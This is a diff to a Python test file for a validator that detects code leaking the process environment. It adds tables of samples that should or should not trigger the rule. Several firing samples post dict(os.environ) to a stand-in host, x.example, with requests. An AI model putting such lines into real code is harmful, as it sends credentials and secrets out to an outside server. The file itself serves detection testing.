@@ -444,8 +444,73 @@ NEW_QUIET = {
 }
 
 
-ALL_FIRES = {**FROM_C477_FIRES, **C477_FIRES_NOW_ON_PURPOSE, **NEW_FIRES}
-ALL_QUIET = {**FROM_C477_QUIET, **C477_QUIET_NOW_ON_PURPOSE, **NEW_QUIET}
+
+# Found by the first review round: harmless code that fired, a promised case that was missed, and a format
+# field that made the reader raise. The first group fires; the second stays quiet, each for the reason named.
+R1_FIRES = {
+    "empty_list_body_json_sent": "import requests, os\nrequests.post('https://x.example/', data=[], json=dict(os.environ))\n",
+    "empty_dict_body_json_sent": "import requests, os\nrequests.post('https://x.example/', data={}, json=dict(os.environ))\n",
+    "empty_tuple_body_json_sent": "import requests, os\nrequests.put('https://x.example/', data=(), json=dict(os.environ))\n",
+    "map_run_by_for": "import os\nfor _ in map(print, os.environ.values()):\n    pass\n",
+    "map_run_by_tuple": "import os\ntuple(map(print, os.environ.items()))\n",
+    "map_run_by_sorted": "import os\nsorted(map(print, os.environ.values()))\n",
+    "generator_run_by_any": "import os\nany(print(v) for v in os.environ.values())\n",
+    "generator_run_by_list": "import os\nlist(print(v) for v in os.environ.values())\n",
+    "generator_run_by_for": "import os\nfor _ in (print(v) for v in os.environ.values()):\n    pass\n",
+    "generator_run_by_join": "import os\n''.join(str(print(v)) for v in os.environ.values())\n",
+    "true_filter_still_prints": "import os\n[print(v) for v in os.environ.values() if True]\n",
+    "true_and_prints": "import os\nTrue and print(os.environ)\n",
+    "false_or_prints": "import os\nFalse or print(os.environ)\n",
+    "format_with_all_arguments": "import os\nprint('{0} {1}'.format(os.environ, 1))\n",
+    "format_with_unused_argument": "import os\nprint('{0}'.format(os.environ, 1))\n",
+    "pprint_positional_stream_stderr": "import os, pprint, sys\npprint.pprint(os.environ, sys.stderr)\n",
+    "path_write_to_a_file": "import os\nfrom pathlib import Path\nPath('out.txt').write_text(str(os.environ))\n",
+    "logger_set_level_then_debug": "import os, logging\nlog = logging.getLogger('x')\nlog.setLevel(logging.DEBUG)\nlog.debug('%s', os.environ)\n",
+    "root_set_level_then_debug": "import os, logging\nlogging.getLogger().setLevel(logging.DEBUG)\nlogging.debug('%s', os.environ)\n",
+    "match_guard_not_about_the_loop": "import os\nflag = 1\nfor key, val in os.environ.items():\n    match flag:\n        case 1 if flag:\n            print(val)\n",
+    "python_fence_after_a_closed_text_fence": "```text\nx\n```\n\n```python\nimport os\nprint(os.environ)\n```\n",
+    "python_fence_after_unclosed_other_fence_is_inside_it": "```python\nimport os\nprint(os.environ)\n```\n```text\nstill open\n",
+}
+
+R1_QUIET = {
+    # lazy values are not run: a map or a generator nothing consumes prints nothing
+    "map_stored": "import os\npending = map(print, os.environ.values())\n",
+    "map_bare_statement": "import os\nmap(print, os.environ.values())\n",
+    "generator_stored": "import os\npending = (print(v) for v in os.environ.values())\n",
+    "generator_bare_statement": "import os\n(print(v) for v in os.environ.values())\n",
+    "generator_passed_to_unknown_function": "import os\nconsume((print(v) for v in os.environ.values()))\n",
+    # code that cannot run to the print
+    "false_filter_in_comprehension": "import os\n[print(v) for v in os.environ.values() if False]\n",
+    "false_filter_in_consumed_generator": "import os\nlist(print(v) for v in os.environ.values() if False)\n",
+    "false_and_short_circuit": "import os\nFalse and print(os.environ)\n",
+    "true_or_short_circuit": "import os\nTrue or print(os.environ)\n",
+    "false_conditional_expression": "import os\n1 if False else 2\nx = print(os.environ) if False else None\n",
+    "format_field_without_argument": "import os\nprint('{0} {1}'.format(os.environ))\n",
+    "format_keyword_without_argument": "import os\nprint('{name}'.format(os.environ))\n",
+    # output that goes nowhere
+    "path_to_devnull": "import os\nfrom pathlib import Path\nPath('/dev/null').write_text(str(os.environ))\n",
+    "path_to_os_devnull": "import os\nfrom pathlib import Path\nPath(os.devnull).write_text(str(os.environ))\n",
+    "pprint_positional_stream_devnull": "import os, pprint\npprint.pprint(os.environ, open('/dev/null', 'w'))\n",
+    # the environment is not the process environment
+    "os_environ_replaced": "import os\nos.environ = {'example': 'demo'}\nprint(os.environ)\n",
+    # a name that is not the logger
+    "set_level_on_another_object": "import os, logging\nclass Widget:\n    def setLevel(self, level):\n        pass\nWidget().setLevel(10)\nlogging.debug('%s', os.environ)\n",
+    "set_level_on_a_handler": "import os, logging\nhandler = logging.StreamHandler()\nhandler.setLevel(logging.DEBUG)\nlogging.debug('%s', os.environ)\n",
+    # a case that the guard picks one name for
+    "match_guard_picks_one_name": "import os\nfor key, val in os.environ.items():\n    match True:\n        case _ if key == 'LANG':\n            print(val)\n",
+    "match_guard_picks_one_name_by_value": "import os\nfor key, val in os.environ.items():\n    match 1:\n        case 1 if val.startswith('en_'):\n            print(val)\n",
+    # fences
+    "python_fence_inside_a_text_fence": "````text\n```python\nimport os\nprint(os.environ)\n```\n````\n",
+    "python_fence_inside_a_tilde_text_fence": "~~~markdown\n```python\nimport os\nprint(os.environ)\n```\n~~~\n",
+    "python_fence_inside_a_shell_fence": "```sh\n```python\nimport os\nprint(os.environ)\n```\n```\n",
+    # a format field the reader cannot follow is not a dump, and not an error
+    "format_unicode_digit_index": "import os\nprint('{²}'.format(os.environ))\n",
+    "format_huge_index": "import os\nprint('{" + "9" * 5000 + "}'.format(os.environ))\n",
+    "format_long_index_but_valid_digits": "import os\nprint('{1234567890}'.format(os.environ))\n",
+}
+
+ALL_FIRES = {**FROM_C477_FIRES, **C477_FIRES_NOW_ON_PURPOSE, **NEW_FIRES, **R1_FIRES}
+ALL_QUIET = {**FROM_C477_QUIET, **C477_QUIET_NOW_ON_PURPOSE, **NEW_QUIET, **R1_QUIET}
 
 
 def test_the_tables_do_not_overlap():
@@ -603,6 +668,25 @@ def test_a_match_statement_is_read_where_the_interpreter_parses_it(validator):
 def test_syntax_newer_than_the_interpreter_is_not_read(validator):
     text = "import os\nmatch x:\n    case 1:\n        print(os.environ)\n"
     assert hits(validator, text) == []
+
+
+def test_a_format_field_the_reader_cannot_follow_does_not_raise_or_mark_the_scan_incomplete(engine, validator):
+    for text in (R1_QUIET["format_unicode_digit_index"], R1_QUIET["format_huge_index"]):
+        assert validator.run(text) == []
+        result = engine.scan(text, channel="file")
+        assert result.inspection_complete is True
+        assert not any(RULE in w for w in result.extraction_warnings)
+
+
+def test_a_format_index_is_never_converted_to_an_integer_past_nine_digits():
+    assert validators_module._brace_slots("{" + "7" * 5000 + "}") is None
+    assert validators_module._brace_slots("{²}") == [("²", True, False)]
+    assert validators_module._brace_slots("{0}{12}") == [(0, True, False), (12, True, False)]
+
+
+def test_a_text_fence_opened_after_a_python_fence_does_not_cut_the_block(validator):
+    text = "```python\nimport os\nprint(os.environ)\n```\n\n````text\n```python\nx = 1\n```\n````\n"
+    assert hits(validator, text) == [RULE]
 
 
 def test_a_text_that_is_not_python_and_has_no_fence_is_not_read(validator):
